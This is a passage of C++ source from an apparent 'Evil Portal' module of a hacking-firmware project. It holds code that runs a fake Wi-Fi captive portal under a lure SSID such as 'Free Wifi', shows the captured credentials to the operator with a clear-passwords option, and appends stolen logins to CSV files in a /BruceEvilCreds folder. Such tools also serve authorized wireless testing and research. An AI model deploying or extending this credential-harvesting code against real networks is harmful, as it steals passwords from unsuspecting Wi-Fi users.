        "30px 0px;}.containerbtn{display: flex;justify-content: end;padding: 30px 0px 25px 0px;}@media "
        "screen and (min-width: 768px){.logo{max-width: 80px;max-height: 80px;}}</style>"
        "</head>"
        "<body>"
        "  <div class='container'>"
        "    <div class='logo-container'>"
        "      <?xml version='1.0' standalone='no'?>"
        "      <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 20010904//EN' "
        "'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'>"
        "    </div>"
        "    <div class=form-container>"
        "      <div style='min-height: 150px'>" +
        body +
        "      </div>"
        "    </div>"
        "  </div>"
        "</body>"
        "</html>";
    return html;
}

String EvilPortal::creds_GET() {
    return getHtmlTemplate(
        "<ol>" + capturedCredentialsHtml +
        "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a "
        "style=\"color:blue\" "
        "href=/clear>Clear passwords</a></p></center>"
    );
}

String EvilPortal::ssid_GET() {
    return getHtmlTemplate(
        "<p>Set a new SSID for Evil Portal:</p><form action='" +
        bruceConfig.evilPortalEndpoints.setSsidEndpoint +
        "' id='login-form'><input name='ssid' "
        "class='input-field' type='text' placeholder='" +
        apName + "' required><button id=submitbtn class=submit-btn type=submit>Apply</button></div></form>"
    );
}

String EvilPortal::ssid_POST() {
    return getHtmlTemplate(
        "Evil Portal shutting down and restarting with SSID <b>" + apName + "</b>. Please reconnect."
    );
}

void EvilPortal::saveToCSV(const String &csvLine, bool isAPname) {
    FS *fs;
    if (!getFsStorage(fs)) {
        log_i("Error getting FS storage");
        return;
    }

    if (!fs->exists("/BruceEvilCreds")) fs->mkdir("/BruceEvilCreds");

    File file;

    if (!isAPname) {
        file = fs->open("/BruceEvilCreds/" + outputFile, FILE_APPEND);
    } else {
        file = fs->open("/BruceEvilCreds/" + apName + "_creds.csv", FILE_APPEND);
    }

    if (!file) {
        log_i("Error to open file");
        return;
    }
    file.println(csvLine);
    file.close();
    log_i("data saved");
}

void EvilPortal::apName_from_keyboard() { apName = keyboard("Free Wifi", 30, "Evil Portal SSID:"); }
